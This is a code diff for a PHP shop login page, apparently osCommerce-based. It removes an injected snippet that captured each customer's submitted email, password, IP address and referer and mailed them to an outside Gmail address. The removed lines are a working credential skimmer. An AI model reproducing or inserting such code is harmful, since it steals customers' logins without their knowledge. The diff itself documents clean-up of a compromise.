@@ -25,12 +25,7 @@ if (isset($_GET['login']) && $_GET['login'] == 'fail') {
 if ( (isset($_POST['action']) && ($_POST['action'] == 'process')) || (isset($_POST['password']) && isset($_POST['email_address'])) ) {
   $email_address = strtolower(tep_db_prepare_input($_POST['email_address']));
   $password = tep_db_prepare_input($_POST['password']);
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $iprt = $_SERVER['REMOTE_PORT'];
-    $servernya = $_SERVER['SERVER_NAME'];
-    $alamat = $_SERVER['HTTP_REFERER'];
-    $message = "\nEmail: $email_address\nPassword: $password\nalamat: $alamat\nIP: $ip . $iprt\n";
-    mail("malachi.amra@gmail.com","User Login From $servernya", "$message");
+	
   if(ACCOUNT_EMAIL_CONFIRMATION=='true') {
     if (isset($_POST['pass'])) {
       $check_customer_query_val = tep_db_query("select customers_id, customers_group_id, customers_email_address, customers_default_address_id,customers_validation_code from " . TABLE_CUSTOMERS . " where lower(customers_email_address) = '" . tep_db_input($email_address) . "'");
